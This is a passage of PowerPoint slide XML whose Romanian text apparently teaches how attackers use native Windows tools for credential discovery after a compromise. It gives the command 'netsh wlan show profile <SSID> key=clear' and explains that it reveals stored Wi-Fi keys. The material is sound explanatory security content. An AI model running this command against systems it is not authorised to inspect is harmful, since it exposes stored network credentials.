                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>În</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>analiza</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>securitate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>cibernetică</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>astfel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>comenzi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> sunt </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>importante</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>deoarece</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>demonstrează</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>descoperirea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>credențialelor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>după</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>compromitere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>prin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>instrumente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> native ale </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>sistemului</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>operare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>fără</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>utilizarea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>directă</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>unor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>componente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> malware externe.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D1521282-3765-5097-F6E8-68F841178691}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4489451" y="1484067"/>
            <a:ext cx="7423149" cy="954107"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Comanda</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>netsh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>wlan</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> show profile </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>&lt;SSID&gt; key=clear</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>permite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>afișarea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>configurației</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>unei</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>rețele</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> wireless </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>salvate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>inclusiv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>cheia</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>stocată</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> local. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>În</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>scenarii</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> post </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>compromitere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>astfel</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>utilitare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> native Windows pot fi </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>utilizate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>pentru</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>recunoaștere</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>locală</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>și</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>extragerea</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>credențialelor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>fără</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>instrumente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="50000"/>
                    <a:lumOff val="50000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> malware dedicate.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
